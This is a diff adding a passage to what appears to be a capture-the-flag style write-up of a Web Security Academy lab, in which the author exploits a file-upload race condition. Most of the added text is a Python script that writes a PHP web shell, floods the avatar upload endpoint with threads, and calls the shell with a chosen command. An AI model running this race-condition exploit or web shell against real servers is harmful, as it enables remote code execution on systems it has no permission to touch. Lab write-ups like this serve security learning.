@@ -240,3 +240,69 @@ We can't upload a php file but with this race condition we can do that
 
 I made a script to quickly upload a php file in hopes that when it still in the default directory which is */avatars/files/* and it hasn't done the file type check i'm able to run the file
 
+```python
+#!/usr/bin/python3
+
+import requests
+from threading import Thread
+import argparse
+from time import sleep
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def makeFile():
+    payload = "<?php system($_GET['cmd']); ?>"
+
+    with open('shell.php', 'w') as f:
+        f.write(payload)
+
+def sendRequest(url, file, data, cookie):
+    requests.post(url + 'my-account/avatar', files=file, data=data, cookies=cookie)
+
+def retrieveRequest(url, command, cookie):
+    result = requests.get(url + f'files/avatars/shell.php?cmd={command}', cookies=cookie)
+
+    if result.status_code == 200 and 'Error' not in result.text:
+        print(result.text)
+
+def main():
+    makeFile()
+    
+    url = 'https://0af60017037aeaf9865a590300bd0046.web-security-academy.net/'
+    
+    with open('./shell.php', 'rb') as f:
+        file_content = f.read()
+
+    file = {
+        'avater': ('shell.php', file_content, 'application/x-php')
+    }
+
+    data = {
+        'user': 'wiener',
+        'csrf': 'xStqpZLyao7XfbgFG65ICBuWA5GzBno0'
+    }
+
+    cookie = {
+        'session': 'XZUmLhFZv15kw0JBehTisCe146SXSQC7'
+    }
+
+    proxy = {
+        'https': 'http://127.0.0.1:8080'
+    }
+
+    for i in range(200):
+        Thread(target=sendRequest, args=(url, file, data, cookie)).start()
+        Thread(target=retrieveRequest, args=(url, args.command, cookie)).start()
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-c', '--command', required=True, help='The command to be executed')
+    args = parser.parse_args()
+
+    main()
+```
+
+I really tried so many attempts for it to work i don't know why but after some large number of request the web server just stops accepting file then resumes it back 💀
+
+
+
